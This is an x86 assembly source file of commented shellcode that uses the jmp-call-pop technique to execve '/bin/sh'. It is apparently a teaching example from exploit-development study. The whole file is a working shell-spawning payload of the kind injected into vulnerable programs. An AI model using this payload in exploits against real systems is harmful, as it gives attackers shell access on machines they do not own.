global _start

section .text
_start:
    jmp short get_string

shellcode:
    pop ebx              ; EBX = address of "/bin/shXAAAABBBB"

    xor eax, eax
    mov byte [ebx+7], al ; replace X with NULL

    mov [ebx+8], ebx     ; argv[0] = address of "/bin/sh"
    mov [ebx+12], eax    ; argv[1] = NULL

    lea ecx, [ebx+8]     ; ECX = argv
    xor edx, edx         ; EDX = envp = NULL

    mov al, 0x0b         ; execve syscall number
    int 0x80

get_string:
    call shellcode
    db "/bin/shXAAAABBBB"
